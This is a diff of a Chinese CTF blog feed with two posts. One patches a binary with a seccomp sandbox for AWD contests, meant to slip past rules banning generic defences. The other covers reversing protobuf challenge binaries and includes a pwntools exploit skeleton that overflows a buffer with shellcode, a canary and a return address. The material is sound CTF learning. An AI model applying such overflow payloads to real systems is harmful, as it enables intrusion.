+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line">sock_filter = p64(<span class="number">0x20</span>) + p64(<span class="number">0x3b01000015</span>) + p64(<span class="number">6</span>) + p64(<span class="number">0x7fff000000000006</span>)</span><br><span class="line">sock_filter_addr = awd_pwn_patcher.add_constant_in_ehframe(sock_filter)</span><br><span class="line"></span><br><span class="line">prog = p64(<span class="number">4</span>) + p64(sock_filter_addr)</span><br><span class="line">prog_addr = awd_pwn_patcher.add_constant_in_ehframe(prog)</span><br><span class="line"></span><br><span class="line">assembly = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,157</span></span><br><span class="line"><span class="string">    mov rdi,22</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    lea rdx,[<span class="subst">&#123;prog_addr&#125;</span>]</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call 0x40117A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.patch_by_jmp(jmp_from=<span class="number">0x4011F0</span>,jmp_to=<span class="number">0x4011F5</span>,assembly=assembly)</span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure></div>
+
+<p>这时候本来充满期待开始调试二进制程序，但是首先遇到的问题是ehframe段不可执行，一般来说awd_pwn_patcher.save()时会自动把这个段设为可执行，但这里不知道出了什么问题，得自己手动来。根据<a class="link"   href="https://blog.csdn.net/qq_46106285/article/details/124972056" >https://blog.csdn.net/qq_46106285/article/details/124972056<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这篇博客能够成功地设置段权限。第二个问题是我在root用户下安装pwntools后，发现会让正常用户gdb调试时出现问题，这个问题的解决方案是起一个python的虚拟环境给root用，或者是<code>sudo pip install --user pwntools</code>来指定只给root用户安装python库。之后运行就不会出现问题了。</p>
+<p>运行没有patch过的程序：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151236768.png"
+                      class=""
+                >
+
+<p>经过patch之后：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151247626.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151256919.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151305738.png"
+                      class=""
+                >
+
+<p>经过计算，构造禁用execve沙箱所用的仅有0x53字节，一般而言ehframe段还是够用的，每个多加的规则也只会多出8字节的开销，改一下结构体的参数就行。但由于前提是要有root权限执行程序，也是挺鸡肋的。</p>
+<h3 id="三、自动化工具"><a href="#三、自动化工具" class="headerlink" title="三、自动化工具"></a>三、自动化工具</h3><p>感觉这个挺有意思的，感觉逻辑也挺简单，上头了小写一手自动化工具（虽然没有什么卵用）</p>
+<p>效果图：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151317438.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151328087.png"
+                      class=""
+                >
+
+<p><a class="link"   href="https://github.com/collectcrop/SandboxAttacher" >https://github.com/collectcrop/SandboxAttacher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>sandbox</tag>
       </tags>
   </entry>
   <entry>
@@ -1424,328 +1746,6 @@
       </tags>
   </entry>
   <entry>
-    <title>protobuf初探</title>
-    <url>/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/</url>
-    <content><![CDATA[<h2 id="protobuf-pwn初探"><a href="#protobuf-pwn初探" class="headerlink" title="protobuf pwn初探"></a>protobuf pwn初探</h2><h4 id="protobuf简介"><a href="#protobuf简介" class="headerlink" title="protobuf简介"></a>protobuf简介</h4><p>Protocol Buffers（通常简称为protobuf）是由Google开发的一种语言中立、平台中立的序列化结构数据的方法。它用于高效地存储和交换数据，特别适合用于网络通信和数据存储。protobuf的主要特点包括：</p>
-<ol>
-<li><strong>高效性</strong>：protobuf使用紧凑的二进制格式，比其他文本格式（如JSON或XML）更小、更快。</li>
-<li><strong>语言中立</strong>：支持多种编程语言，包括C++、Java、Python、Go等，使得跨平台的数据交换变得简单。</li>
-<li><strong>易于扩展</strong>：可以在不破坏现有数据结构的情况下，轻松地添加新字段。</li>
-<li><strong>定义文件</strong>：使用<code>.proto</code>文件来定义数据结构和服务，可以通过工具自动生成相应的代码。</li>
-</ol>
-<p>通过protobuf，开发者可以定义消息类型，使用这些类型进行数据序列化和反序列化，从而在不同的系统或服务之间传输数据。</p>
-<p><strong>Proto2</strong>: 支持 <code>required</code> 和 <code>optional</code> 修饰符。</p>
-<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持 <code>required</code></p>
-<h4 id="工具集安装"><a href="#工具集安装" class="headerlink" title="工具集安装"></a>工具集安装</h4><ul>
-<li>pbtk:（自动化分析）</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">git clone https://github.com/marin-m/pbtk</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>Protobuf 库:（本地搓proto文件并编译成python）</li>
-</ul>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y protobuf-compiler libprotobuf-dev		</span><br><span class="line">sudo apt-get install libprotobuf-c-dev protobuf-c-compiler</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>protobuf这类题一般都会将输入转化成特殊的结构体，这就要求我们首先要</p>
-<h4 id="一些结构体定义"><a href="#一些结构体定义" class="headerlink" title="一些结构体定义"></a>一些结构体定义</h4><h6 id="ProtobufCFieldDescriptor"><a href="#ProtobufCFieldDescriptor" class="headerlink" title="ProtobufCFieldDescriptor"></a>ProtobufCFieldDescriptor</h6><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
-                      class=""
-                >
-
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">    <span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>      *name;				</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">uint32_t</span>        id;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">    ProtobufCLabel      label;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The type of the field. */</span></span><br><span class="line">    ProtobufCType       type;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment">     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment">     * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        quantifier_offset;							</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment">     * itself.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        offset;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A type-specific descriptor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment">     * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment">     * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *default_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment">     * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">uint32_t</span>        flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">unsigned</span>        reserved_flags;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved2;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
-
-<h6 id="label和type"><a href="#label和type" class="headerlink" title="label和type"></a>label和type</h6><p>label和type都是枚举类型：</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">     * more than one).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">     * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">     * preserved.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">     * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT32,      <span class="comment">/**0&lt; int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**1&lt; signed int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**2&lt; signed int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT64,      <span class="comment">/**3&lt; int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**4&lt; signed int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**5&lt; signed int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**6&lt; unsigned int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**7&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**8&lt; unsigned int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**9&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**10&lt; float */</span></span><br><span class="line">    PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**11&lt; double */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**12&lt; boolean */</span></span><br><span class="line">    PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**13&lt; enumerated type */</span></span><br><span class="line">    PROTOBUF_C_TYPE_STRING,     <span class="comment">/**14&lt; UTF-8 or ASCII string */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**15&lt; arbitrary byte sequence */</span></span><br><span class="line">    PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**16&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="定位结构体方式"><a href="#定位结构体方式" class="headerlink" title="定位结构体方式"></a>定位结构体方式</h4><h5 id="1-手动定位"><a href="#1-手动定位" class="headerlink" title="1.手动定位"></a>1.手动定位</h5><p>因为我们输入的内容会通过<code>protobuf_c_message_unpack</code>这个函数进行解析。所以我们可以对比链接库中的函数具体定义以及我们pwn的主程序中调用的传参。然后就能跳转到主程序中的具体descriptor中进行下一步分析。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144416901.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144538997.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144611512.png"
-                      class=""
-                >
-
-<p>首先要在主程序里找一个<code>message_descriptor</code>，一般在.data.rel.ro段，其开头的魔数(magic)是0x28AAEEF9，一般而言下面会直接解析出Protobuf结构体的名字，但也有IDA识别不出来的情况，我们可以手动将db类型转为dq类型，然后就会清晰很多。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026143624589.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144134084.png"
-                      class=""
-                >
-
-<p>我们的消息结构体名字就为<code>MyMessage</code>。接着我们可以往<code>my_message__field_descriptors</code>里看，里面就是具体的字段，也就是<code>ProtobufCFieldDescriptor</code>这个结构体。但是也都被IDA当作了db解析，我们可以按照下表结构体的字段分布进行修改，手动将其解析一下，主要看name，id，label，type，其他怎么改影响不大。一下子就清晰了不少，然后我们就可以对照着枚举表还原出protobuf了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144919768.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026150209780.png"
-                      class=""
-                >
-
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//message.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message MyMessage&#123;</span><br><span class="line">    optional <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">    required bytes buffer = <span class="number">3</span>;</span><br><span class="line">    required uint32 size = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>然后在命令行将其转化成python文件即可</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">protoc --python_out=. message.proto</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h5 id="2-自动分析"><a href="#2-自动分析" class="headerlink" title="2.自动分析"></a>2.自动分析</h5><p>首先进入之前安装好的pbtk目录，<code>python3 gui.py</code> 就可以启动一个gui窗口，然后选择<code>Extract .proto structures from apps</code>，就可以选择pwn程序自动提取其中的proto文件了。但有时会不灵，还是手动分析有趣。</p>
-<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><p>分析完proto的结构，就可以进行exp脚本的编写了，之前我们通过proto生成的python文件名为<code>proto结构体名_pb2</code>，可以先导入exp。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> message_pb2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">......</span><br><span class="line">msg = message_pb2.MyMessage()		<span class="comment">#创建结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#各字段赋值</span></span><br><span class="line">msg.name = <span class="string">&#x27;Admin&#x27;</span></span><br><span class="line">msg.buffer = shellcode.ljust(<span class="number">0x208</span>,<span class="string">b&quot;a&quot;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(tar)</span><br><span class="line">msg.size = <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">payload = msg.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h4 id="判别proto版本方式"><a href="#判别proto版本方式" class="headerlink" title="判别proto版本方式"></a>判别proto版本方式</h4><p>一般proto分为proto2和proto3两个版本，在写proto文件时要在开头指明<code>syntax=proto2/3</code>。</p>
-<p>在proto3中移除了require这个修饰符，如果有的label位为0（required），就说明用的是proto2语法。</p>
-<p>其实也可以都带进去试试，总共就两个版本，别的地方没分析错的话总有一个会通过的。</p>
-<h4 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h4><h5 id="1-库找不到"><a href="#1-库找不到" class="headerlink" title="1.库找不到"></a>1.库找不到</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026002833645.png"
-                      class=""
-                >
-
-<p>可以手动在&#x2F;usr&#x2F;lib下添加一个链接</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /mnt/e/ctf/2024shctf/pwn/shctf——challage_pwn_protobuf/libprotobuf-c.so.1 /usr/lib/libprotobuf-c.so.1</span><br></pre></td></tr></table></figure></div>
-
-<h5 id="2-运行exp时因为引入了proto转成的python文件报错"><a href="#2-运行exp时因为引入了proto转成的python文件报错" class="headerlink" title="2.运行exp时因为引入了proto转成的python文件报错"></a>2.运行exp时因为引入了proto转成的python文件报错</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026154314346.png"
-                      class=""
-                >
-
-<p>提高python库中protobuf的版本</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 uninstall protobuf</span><br><span class="line">pip3 install protobuf==3.19.0</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h5 id="3-逆出结构体后prpto一直无法正常解析"><a href="#3-逆出结构体后prpto一直无法正常解析" class="headerlink" title="3.逆出结构体后prpto一直无法正常解析"></a>3.逆出结构体后prpto一直无法正常解析</h5><p>可以尝试把<code>sendline</code>换成<code>send</code>，有时候多一个换行符就解析不出来了。</p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>protobuf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>self-made sandbox</title>
-    <url>/blog/2024/09/21/self-made-sandbox/</url>
-    <content><![CDATA[<p>由于最近要打几场awd，一个一个漏洞改过来感觉有点麻烦，所以想到了上沙箱，但是一般好像比赛会禁止上通防，这里想试试看自己通过系统调用写一个沙箱出来，看看能不能瞒天过海。</p>
-<h3 id="一、c代码实现沙箱"><a href="#一、c代码实现沙箱" class="headerlink" title="一、c代码实现沙箱"></a>一、c代码实现沙箱</h3><p>不是很清楚沙箱具体用到的系统调用，所以先让gpt生成了一段正常用c语言实现的沙箱代码。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_seccomp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">// 读取系统调用号</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否为 execve 系统调用（编号 59）</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果是 execve，则杀死进程</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 允许其他系统调用</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter = filter</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用 seccomp 过滤模式</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    install_seccomp();</span><br><span class="line">    <span class="comment">// 你可以在这里运行原来的程序逻辑</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>这个 <code>install_seccomp()</code> 函数的作用是通过 <code>seccomp</code>（安全计算模式）设置一个简单的沙箱来限制程序能够调用的系统调用，具体来说，是禁止调用 <code>execve</code> 系统调用。如果程序尝试调用 <code>execve</code>，则会被杀死。其余的系统调用则被允许执行。</p>
-<p>以下是其中每个部分的功能和用法的详细解释：</p>
-<h4 id="struct-sock-filter-filter"><a href="#struct-sock-filter-filter" class="headerlink" title="struct sock_filter filter[]"></a>struct sock_filter filter[]</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
-
-<p>这是一个 BPF（Berkeley Packet Filter）过滤器指令数组，用来定义程序的过滤规则。每一条 <code>sock_filter</code> 定义了一条 BPF 指令，用来判断并处理系统调用。</p>
-<p><strong>第一条指令</strong></p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr))</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>这里使用 <code>BPF_LD</code> 加载 <code>seccomp_data</code> 结构体中的 <code>nr</code> 成员（即系统调用号）。</li>
-<li><code>BPF_W</code> 表示加载的是一个 32 位的值。</li>
-<li><code>BPF_ABS</code> 表示从固定的偏移量读取数据。</li>
-<li><code>offsetof(struct seccomp_data, nr)</code> 是 <code>seccomp_data</code> 结构体中 <code>nr</code> 成员的偏移量，<code>nr</code> 是存储系统调用号的字段。</li>
-</ul>
-<p>这条指令的作用是读取当前正在执行的系统调用号，以便后续判断是否是 <code>execve</code> 系统调用。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nr;        <span class="comment">// 系统调用号</span></span><br><span class="line">    __u32 arch;    <span class="comment">// 架构信息</span></span><br><span class="line">    __u64 instruction_pointer; <span class="comment">// 指令指针</span></span><br><span class="line">    __u64 args[<span class="number">6</span>]; <span class="comment">// 系统调用参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
-
-<p>其中由于linux内核中结构体定义如上，所以实际上offsetof(struct seccomp_data, nr)也可以写为0。</p>
-<p><strong>第二条指令</strong></p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>BPF_JMP</code> 指令执行跳转。</li>
-<li><code>BPF_JEQ</code> 是“跳转如果相等”的操作符，表示如果条件为真则跳转。</li>
-<li><code>BPF_K</code> 指定了一个立即数（这里为 59）。</li>
-</ul>
-<p>这条指令会判断加载的系统调用号是否等于 <code>execve</code> 的系统调用号（59）。如果是，则跳过后面的第一条指令，继续执行杀死进程的语句；否则跳过后面的两条指令，直接允许执行系统调用。</p>
-<p><strong>第三条指令</strong></p>
